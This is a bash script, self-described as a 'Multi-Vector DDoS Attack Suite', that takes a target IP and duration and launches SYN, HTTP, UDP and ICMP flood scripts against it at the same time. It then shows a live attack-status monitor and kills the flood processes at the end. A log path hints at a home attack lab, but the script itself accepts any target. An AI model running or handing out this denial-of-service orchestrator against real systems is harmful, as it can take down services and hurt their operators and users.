#!/bin/bash

# Multi-Vector DDoS Attack Suite

TARGET="$1"
DURATION="${2:-120}"

if [ -z "$TARGET" ]; then
    echo "Usage: ./full_ddos_suite.sh <target_ip> [duration]"
    echo "Example: ./full_ddos_suite.sh 192.168.1.5 120"
    exit 1
fi

echo "================================================"
echo "      MULTI-VECTOR DDoS ATTACK SUITE"
echo "================================================"
echo "Target: $TARGET"
echo "Duration: $DURATION seconds"
echo ""
echo "This will start multiple attack vectors simultaneously:"
echo "1. SYN Flood"
echo "2. HTTP Flood"
echo "3. UDP Flood"
echo "4. ICMP Flood"
echo ""
echo "⚠️  WARNING: This is a heavy attack!"
echo ""

read -p "Start attack? (y/N): " confirm
if [[ ! $confirm =~ ^[Yy]$ ]]; then
    echo "Attack cancelled"
    exit 0
fi

echo ""
echo "[+] Starting all attack vectors..."
echo ""

# Get script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Start SYN Flood (requires root)
echo "[1] Starting SYN Flood..."
if [ "$EUID" -eq 0 ]; then
    timeout $DURATION "$SCRIPT_DIR/syn_flood.py" "$TARGET" "$DURATION" 10 &
    SYN_PID=$!
    echo "    PID: $SYN_PID"
else
    echo "    Skipped (requires root)"
fi

# Start HTTP Flood
echo "[2] Starting HTTP Flood..."
timeout $DURATION "$SCRIPT_DIR/http_flood.py" "http://$TARGET" "$DURATION" 50 &
HTTP_PID=$!
echo "    PID: $HTTP_PID"

# Start UDP Flood (requires root)
echo "[3] Starting UDP Flood..."
if [ "$EUID" -eq 0 ]; then
    timeout $DURATION "$SCRIPT_DIR/udp_flood.sh" "$TARGET" "$DURATION" 5 &
    UDP_PID=$!
    echo "    PID: $UDP_PID"
else
    echo "    Skipped (requires root)"
fi

# Start ICMP Flood (requires root)
echo "[4] Starting ICMP Flood..."
if [ "$EUID" -eq 0 ]; then
    timeout $DURATION "$SCRIPT_DIR/icmp_flood.sh" "$TARGET" "$DURATION" 10 &
    ICMP_PID=$!
    echo "    PID: $ICMP_PID"
else
    echo "    Skipped (requires root)"
fi

echo ""
echo "[+] All attacks started"
echo "[+] Attack will run for $DURATION seconds"
echo ""
echo "Monitoring attack progress..."
echo ""

# Monitor progress
start_time=$(date +%s)
while [ $(($(date +%s) - start_time)) -lt $DURATION ]; do
    elapsed=$(( $(date +%s) - start_time ))
    remaining=$(( DURATION - elapsed ))
    
    # Count running attack processes
    syn_count=$(ps aux | grep -c "[s]yn_flood.py.*$TARGET")
    http_count=$(ps aux | grep -c "[h]ttp_flood.py.*$TARGET")
    udp_count=$(ps aux | grep -c "[u]dp_flood.sh.*$TARGET")
    icmp_count=$(ps aux | grep -c "[i]cmp_flood.sh.*$TARGET")
    
    clear
    echo "================================================"
    echo "      ATTACK PROGRESS MONITOR"
    echo "================================================"
    echo "Target: $TARGET"
    echo "Elapsed: ${elapsed}s / ${DURATION}s"
    echo "Remaining: ${remaining}s"
    echo ""
    echo "Attack Status:"
    echo "──────────────"
    echo "SYN Flood:   $(if [ $syn_count -gt 0 ]; then echo "✅ ACTIVE"; else echo "❌ INACTIVE"; fi)"
    echo "HTTP Flood:  $(if [ $http_count -gt 0 ]; then echo "✅ ACTIVE"; else echo "❌ INACTIVE"; fi)"
    echo "UDP Flood:   $(if [ $udp_count -gt 0 ]; then echo "✅ ACTIVE"; else echo "❌ INACTIVE"; fi)"
    echo "ICMP Flood:  $(if [ $icmp_count -gt 0 ]; then echo "✅ ACTIVE"; else echo "❌ INACTIVE"; fi)"
    echo ""
    echo "Press Ctrl+C to stop all attacks"
    echo "================================================"
    
    sleep 2
done

echo ""
echo "[+] Attack duration completed"
echo "[+] Stopping all attacks..."

# Cleanup
pkill -f "syn_flood.py.*$TARGET" 2>/dev/null
pkill -f "http_flood.py.*$TARGET" 2>/dev/null
pkill -f "udp_flood.sh.*$TARGET" 2>/dev/null
pkill -f "icmp_flood.sh.*$TARGET" 2>/dev/null
pkill -f "hping3.*$TARGET" 2>/dev/null
pkill -f "ping.*$TARGET" 2>/dev/null
pkill -f "nc.*$TARGET" 2>/dev/null

echo "[+] All attacks stopped"
echo ""
echo "================================================"
echo "      ATTACK COMPLETED"
echo "================================================"
echo "Check target server for impact analysis"
echo "Logs saved to: ~/ddos-enterprise-lab/kali-attacker/logs/"
echo "================================================"
